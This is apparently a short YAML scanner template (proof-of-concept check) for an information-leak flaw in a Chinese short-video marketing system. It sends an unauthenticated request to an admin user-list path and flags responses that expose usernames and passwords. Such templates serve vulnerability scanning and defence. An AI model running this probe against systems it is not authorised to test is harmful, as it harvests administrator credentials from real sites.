id: poc-yaml-short-video-matrix-user-leak-info
info:
  name: 短视频矩阵营销系统 admin/user 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: file-read
http:
  - method: GET
    path:
      - "/index.php/admin/user/index.html?page=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - contains(find_json(body, '0.password'), '')
          - contains(find_json(body, '0.username'), '')
